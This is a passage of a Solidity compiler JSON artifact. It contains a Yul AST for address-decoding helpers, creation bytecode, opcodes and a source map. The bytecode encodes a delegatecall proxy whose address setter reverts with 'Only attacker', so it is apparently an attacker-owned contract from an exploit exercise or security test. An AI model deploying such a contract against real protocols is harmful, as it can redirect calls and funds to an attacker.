																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nativeSrc": "7:75:1",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nativeSrc": "40:6:1",
														"nodeType": "YulTypedName",
														"src": "40:6:1",
														"type": ""
													}
												],
												"src": "7:75:1"
											},
											{
												"body": {
													"nativeSrc": "177:28:1",
													"nodeType": "YulBlock",
													"src": "177:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "194:1:1",
																		"nodeType": "YulLiteral",
																		"src": "194:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "197:1:1",
																		"nodeType": "YulLiteral",
																		"src": "197:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "187:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "187:6:1"
																},
																"nativeSrc": "187:12:1",
																"nodeType": "YulFunctionCall",
																"src": "187:12:1"
															},
															"nativeSrc": "187:12:1",
															"nodeType": "YulExpressionStatement",
															"src": "187:12:1"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nativeSrc": "88:117:1",
												"nodeType": "YulFunctionDefinition",
												"src": "88:117:1"
											},
											{
												"body": {
													"nativeSrc": "300:28:1",
													"nodeType": "YulBlock",
													"src": "300:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "317:1:1",
																		"nodeType": "YulLiteral",
																		"src": "317:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "320:1:1",
																		"nodeType": "YulLiteral",
																		"src": "320:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "310:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "310:6:1"
																},
																"nativeSrc": "310:12:1",
																"nodeType": "YulFunctionCall",
																"src": "310:12:1"
															},
															"nativeSrc": "310:12:1",
															"nodeType": "YulExpressionStatement",
															"src": "310:12:1"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nativeSrc": "211:117:1",
												"nodeType": "YulFunctionDefinition",
												"src": "211:117:1"
											},
											{
												"body": {
													"nativeSrc": "379:81:1",
													"nodeType": "YulBlock",
													"src": "379:81:1",
													"statements": [
														{
															"nativeSrc": "389:65:1",
															"nodeType": "YulAssignment",
															"src": "389:65:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "404:5:1",
																		"nodeType": "YulIdentifier",
																		"src": "404:5:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "411:42:1",
																		"nodeType": "YulLiteral",
																		"src": "411:42:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nativeSrc": "400:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "400:3:1"
																},
																"nativeSrc": "400:54:1",
																"nodeType": "YulFunctionCall",
																"src": "400:54:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "389:7:1",
																	"nodeType": "YulIdentifier",
																	"src": "389:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nativeSrc": "334:126:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "361:5:1",
														"nodeType": "YulTypedName",
														"src": "361:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "371:7:1",
														"nodeType": "YulTypedName",
														"src": "371:7:1",
														"type": ""
													}
												],
												"src": "334:126:1"
											},
											{
												"body": {
													"nativeSrc": "511:51:1",
													"nodeType": "YulBlock",
													"src": "511:51:1",
													"statements": [
														{
															"nativeSrc": "521:35:1",
															"nodeType": "YulAssignment",
															"src": "521:35:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "550:5:1",
																		"nodeType": "YulIdentifier",
																		"src": "550:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nativeSrc": "532:17:1",
																	"nodeType": "YulIdentifier",
																	"src": "532:17:1"
																},
																"nativeSrc": "532:24:1",
																"nodeType": "YulFunctionCall",
																"src": "532:24:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "521:7:1",
																	"nodeType": "YulIdentifier",
																	"src": "521:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nativeSrc": "466:96:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "493:5:1",
														"nodeType": "YulTypedName",
														"src": "493:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "503:7:1",
														"nodeType": "YulTypedName",
														"src": "503:7:1",
														"type": ""
													}
												],
												"src": "466:96:1"
											},
											{
												"body": {
													"nativeSrc": "611:79:1",
													"nodeType": "YulBlock",
													"src": "611:79:1",
													"statements": [
														{
															"body": {
																"nativeSrc": "668:16:1",
																"nodeType": "YulBlock",
																"src": "668:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nativeSrc": "677:1:1",
																					"nodeType": "YulLiteral",
																					"src": "677:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nativeSrc": "680:1:1",
																					"nodeType": "YulLiteral",
																					"src": "680:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nativeSrc": "670:6:1",
																				"nodeType": "YulIdentifier",
																				"src": "670:6:1"
																			},
																			"nativeSrc": "670:12:1",
																			"nodeType": "YulFunctionCall",
																			"src": "670:12:1"
																		},
																		"nativeSrc": "670:12:1",
																		"nodeType": "YulExpressionStatement",
																		"src": "670:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "634:5:1",
																				"nodeType": "YulIdentifier",
																				"src": "634:5:1"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nativeSrc": "659:5:1",
																						"nodeType": "YulIdentifier",
																						"src": "659:5:1"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address",
																					"nativeSrc": "641:17:1",
																					"nodeType": "YulIdentifier",
																					"src": "641:17:1"
																				},
																				"nativeSrc": "641:24:1",
																				"nodeType": "YulFunctionCall",
																				"src": "641:24:1"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nativeSrc": "631:2:1",
																			"nodeType": "YulIdentifier",
																			"src": "631:2:1"
																		},
																		"nativeSrc": "631:35:1",
																		"nodeType": "YulFunctionCall",
																		"src": "631:35:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "624:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "624:6:1"
																},
																"nativeSrc": "624:43:1",
																"nodeType": "YulFunctionCall",
																"src": "624:43:1"
															},
															"nativeSrc": "621:63:1",
															"nodeType": "YulIf",
															"src": "621:63:1"
														}
													]
												},
												"name": "validator_revert_t_address",
												"nativeSrc": "568:122:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "604:5:1",
														"nodeType": "YulTypedName",
														"src": "604:5:1",
														"type": ""
													}
												],
												"src": "568:122:1"
											},
											{
												"body": {
													"nativeSrc": "759:80:1",
													"nodeType": "YulBlock",
													"src": "759:80:1",
													"statements": [
														{
															"nativeSrc": "769:22:1",
															"nodeType": "YulAssignment",
															"src": "769:22:1",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nativeSrc": "784:6:1",
																		"nodeType": "YulIdentifier",
																		"src": "784:6:1"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "778:5:1",
																	"nodeType": "YulIdentifier",
																	"src": "778:5:1"
																},
																"nativeSrc": "778:13:1",
																"nodeType": "YulFunctionCall",
																"src": "778:13:1"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nativeSrc": "769:5:1",
																	"nodeType": "YulIdentifier",
																	"src": "769:5:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "827:5:1",
																		"nodeType": "YulIdentifier",
																		"src": "827:5:1"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address",
																	"nativeSrc": "800:26:1",
																	"nodeType": "YulIdentifier",
																	"src": "800:26:1"
																},
																"nativeSrc": "800:33:1",
																"nodeType": "YulFunctionCall",
																"src": "800:33:1"
															},
															"nativeSrc": "800:33:1",
															"nodeType": "YulExpressionStatement",
															"src": "800:33:1"
														}
													]
												},
												"name": "abi_decode_t_address_fromMemory",
												"nativeSrc": "696:143:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nativeSrc": "737:6:1",
														"nodeType": "YulTypedName",
														"src": "737:6:1",
														"type": ""
													},
													{
														"name": "end",
														"nativeSrc": "745:3:1",
														"nodeType": "YulTypedName",
														"src": "745:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nativeSrc": "753:5:1",
														"nodeType": "YulTypedName",
														"src": "753:5:1",
														"type": ""
													}
												],
												"src": "696:143:1"
											},
											{
												"body": {
													"nativeSrc": "939:413:1",
													"nodeType": "YulBlock",
													"src": "939:413:1",
													"statements": [
														{
															"body": {
																"nativeSrc": "985:83:1",
																"nodeType": "YulBlock",
																"src": "985:83:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nativeSrc": "987:77:1",
																				"nodeType": "YulIdentifier",
																				"src": "987:77:1"
																			},
																			"nativeSrc": "987:79:1",
																			"nodeType": "YulFunctionCall",
																			"src": "987:79:1"
																		},
																		"nativeSrc": "987:79:1",
																		"nodeType": "YulExpressionStatement",
																		"src": "987:79:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nativeSrc": "960:7:1",
																				"nodeType": "YulIdentifier",
																				"src": "960:7:1"
																			},
																			{
																				"name": "headStart",
																				"nativeSrc": "969:9:1",
																				"nodeType": "YulIdentifier",
																				"src": "969:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nativeSrc": "956:3:1",
																			"nodeType": "YulIdentifier",
																			"src": "956:3:1"
																		},
																		"nativeSrc": "956:23:1",
																		"nodeType": "YulFunctionCall",
																		"src": "956:23:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "981:2:1",
																		"nodeType": "YulLiteral",
																		"src": "981:2:1",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nativeSrc": "952:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "952:3:1"
																},
																"nativeSrc": "952:32:1",
																"nodeType": "YulFunctionCall",
																"src": "952:32:1"
															},
															"nativeSrc": "949:119:1",
															"nodeType": "YulIf",
															"src": "949:119:1"
														},
														{
															"nativeSrc": "1078:128:1",
															"nodeType": "YulBlock",
															"src": "1078:128:1",
															"statements": [
																{
																	"nativeSrc": "1093:15:1",
																	"nodeType": "YulVariableDeclaration",
																	"src": "1093:15:1",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "1107:1:1",
																		"nodeType": "YulLiteral",
																		"src": "1107:1:1",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "1097:6:1",
																			"nodeType": "YulTypedName",
																			"src": "1097:6:1",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "1122:74:1",
																	"nodeType": "YulAssignment",
																	"src": "1122:74:1",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "1168:9:1",
																						"nodeType": "YulIdentifier",
																						"src": "1168:9:1"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "1179:6:1",
																						"nodeType": "YulIdentifier",
																						"src": "1179:6:1"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "1164:3:1",
																					"nodeType": "YulIdentifier",
																					"src": "1164:3:1"
																				},
																				"nativeSrc": "1164:22:1",
																				"nodeType": "YulFunctionCall",
																				"src": "1164:22:1"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "1188:7:1",
																				"nodeType": "YulIdentifier",
																				"src": "1188:7:1"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address_fromMemory",
																			"nativeSrc": "1132:31:1",
																			"nodeType": "YulIdentifier",
																			"src": "1132:31:1"
																		},
																		"nativeSrc": "1132:64:1",
																		"nodeType": "YulFunctionCall",
																		"src": "1132:64:1"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nativeSrc": "1122:6:1",
																			"nodeType": "YulIdentifier",
																			"src": "1122:6:1"
																		}
																	]
																}
															]
														},
														{
															"nativeSrc": "1216:129:1",
															"nodeType": "YulBlock",
															"src": "1216:129:1",
															"statements": [
																{
																	"nativeSrc": "1231:16:1",
																	"nodeType": "YulVariableDeclaration",
																	"src": "1231:16:1",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "1245:2:1",
																		"nodeType": "YulLiteral",
																		"src": "1245:2:1",
																		"type": "",
																		"value": "32"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "1235:6:1",
																			"nodeType": "YulTypedName",
																			"src": "1235:6:1",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "1261:74:1",
																	"nodeType": "YulAssignment",
																	"src": "1261:74:1",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "1307:9:1",
																						"nodeType": "YulIdentifier",
																						"src": "1307:9:1"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "1318:6:1",
																						"nodeType": "YulIdentifier",
																						"src": "1318:6:1"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "1303:3:1",
																					"nodeType": "YulIdentifier",
																					"src": "1303:3:1"
																				},
																				"nativeSrc": "1303:22:1",
																				"nodeType": "YulFunctionCall",
																				"src": "1303:22:1"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "1327:7:1",
																				"nodeType": "YulIdentifier",
																				"src": "1327:7:1"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address_fromMemory",
																			"nativeSrc": "1271:31:1",
																			"nodeType": "YulIdentifier",
																			"src": "1271:31:1"
																		},
																		"nativeSrc": "1271:64:1",
																		"nodeType": "YulFunctionCall",
																		"src": "1271:64:1"
																	},
																	"variableNames": [
																		{
																			"name": "value1",
																			"nativeSrc": "1261:6:1",
																			"nodeType": "YulIdentifier",
																			"src": "1261:6:1"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_addresst_address_fromMemory",
												"nativeSrc": "845:507:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "901:9:1",
														"nodeType": "YulTypedName",
														"src": "901:9:1",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nativeSrc": "912:7:1",
														"nodeType": "YulTypedName",
														"src": "912:7:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nativeSrc": "924:6:1",
														"nodeType": "YulTypedName",
														"src": "924:6:1",
														"type": ""
													},
													{
														"name": "value1",
														"nativeSrc": "932:6:1",
														"nodeType": "YulTypedName",
														"src": "932:6:1",
														"type": ""
													}
												],
												"src": "845:507:1"
											}
										]
									},
									"contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_addresst_address_fromMemory(headStart, dataEnd) -> value0, value1 {\n        if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"linkReferences": {},
							"object": "608060405234801561000f575f80fd5b506040516104b23803806104b283398181016040528101906100319190610115565b815f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508060015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505050610153565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100e4826100bb565b9050919050565b6100f4816100da565b81146100fe575f80fd5b50565b5f8151905061010f816100eb565b92915050565b5f806040838503121561012b5761012a6100b7565b5b5f61013885828601610101565b925050602061014985828601610101565b9150509250929050565b610352806101605f395ff3fe608060405260043610610037575f3560e01c806348eb76ee1461005e578063795e617e14610088578063e062bb05146100b05761003e565b3661003e57005b365f80375f80365f80545af43d5f803e805f811461005a573d5ff35b3d5ffd5b348015610069575f80fd5b506100726100da565b60405161007f9190610232565b60405180910390f35b348015610093575f80fd5b506100ae60048036038101906100a99190610279565b6100ff565b005b3480156100bb575f80fd5b506100c46101d0565b6040516100d19190610232565b60405180910390f35b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461018e576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610185906102fe565b60405180910390fd5b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61021c826101f3565b9050919050565b61022c81610212565b82525050565b5f6020820190506102455f830184610223565b92915050565b5f80fd5b61025881610212565b8114610262575f80fd5b50565b5f813590506102738161024f565b92915050565b5f6020828403121561028e5761028d61024b565b5b5f61029b84828501610265565b91505092915050565b5f82825260208201905092915050565b7f4f6e6c792061747461636b6572000000000000000000000000000000000000005f82015250565b5f6102e8600d836102a4565b91506102f3826102b4565b602082019050919050565b5f6020820190508181035f830152610315816102dc565b905091905056fea2646970667358221220a34ae33db78f9eebfec9ad10c82be4b74ab10a52c5040f7ca54dde6791ca1c5264736f6c634300081a0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x4B2 CODESIZE SUB DUP1 PUSH2 0x4B2 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0x115 JUMP JUMPDEST DUP2 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 PUSH1 0x1 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP POP PUSH2 0x153 JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xE4 DUP3 PUSH2 0xBB JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xF4 DUP2 PUSH2 0xDA JUMP JUMPDEST DUP2 EQ PUSH2 0xFE JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x10F DUP2 PUSH2 0xEB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x12B JUMPI PUSH2 0x12A PUSH2 0xB7 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x138 DUP6 DUP3 DUP7 ADD PUSH2 0x101 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x149 DUP6 DUP3 DUP7 ADD PUSH2 0x101 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH2 0x352 DUP1 PUSH2 0x160 PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x37 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x48EB76EE EQ PUSH2 0x5E JUMPI DUP1 PUSH4 0x795E617E EQ PUSH2 0x88 JUMPI DUP1 PUSH4 0xE062BB05 EQ PUSH2 0xB0 JUMPI PUSH2 0x3E JUMP JUMPDEST CALLDATASIZE PUSH2 0x3E JUMPI STOP JUMPDEST CALLDATASIZE PUSH0 DUP1 CALLDATACOPY PUSH0 DUP1 CALLDATASIZE PUSH0 DUP1 SLOAD GAS DELEGATECALL RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY DUP1 PUSH0 DUP2 EQ PUSH2 0x5A JUMPI RETURNDATASIZE PUSH0 RETURN JUMPDEST RETURNDATASIZE PUSH0 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x69 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x72 PUSH2 0xDA JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x7F SWAP2 SWAP1 PUSH2 0x232 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x93 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0xAE PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0xA9 SWAP2 SWAP1 PUSH2 0x279 JUMP JUMPDEST PUSH2 0xFF JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xBB JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0xC4 PUSH2 0x1D0 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xD1 SWAP2 SWAP1 PUSH2 0x232 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x18E JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x185 SWAP1 PUSH2 0x2FE JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x21C DUP3 PUSH2 0x1F3 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x22C DUP2 PUSH2 0x212 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x245 PUSH0 DUP4 ADD DUP5 PUSH2 0x223 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x258 DUP2 PUSH2 0x212 JUMP JUMPDEST DUP2 EQ PUSH2 0x262 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x273 DUP2 PUSH2 0x24F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x28E JUMPI PUSH2 0x28D PUSH2 0x24B JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x29B DUP5 DUP3 DUP6 ADD PUSH2 0x265 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4F6E6C792061747461636B657200000000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x2E8 PUSH1 0xD DUP4 PUSH2 0x2A4 JUMP JUMPDEST SWAP2 POP PUSH2 0x2F3 DUP3 PUSH2 0x2B4 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x315 DUP2 PUSH2 0x2DC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 LOG3 BLOBBASEFEE 0xE3 RETURNDATASIZE 0xB7 DUP16 SWAP15 0xEB INVALID 0xC9 0xAD LT 0xC8 0x2B 0xE4 0xB7 BLOBBASEFEE 0xB1 EXP MSTORE 0xC5 DIV 0xF PUSH29 0xA54DDE6791CA1C5264736F6C634300081A003300000000000000000000 ",
							"sourceMap": "141:877:0:-:0;;;237:112;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;306:6;294:9;;:18;;;;;;;;;;;;;;;;;;333:9;322:8;;:20;;;;;;;;;;;;;;;;;;237:112;;141:877;;88:117:1;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:143::-;753:5;784:6;778:13;769:22;;800:33;827:5;800:33;:::i;:::-;696:143;;;;:::o;845:507::-;924:6;932;981:2;969:9;960:7;956:23;952:32;949:119;;;987:79;;:::i;:::-;949:119;1107:1;1132:64;1188:7;1179:6;1168:9;1164:22;1132:64;:::i;:::-;1122:74;;1078:128;1245:2;1271:64;1327:7;1318:6;1307:9;1303:22;1271:64;:::i;:::-;1261:74;;1216:129;845:507;;;;;:::o;141:877:0:-;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@_27": {
									"entryPoint": null,
									"id": 27,
									"parameterSlots": 0,
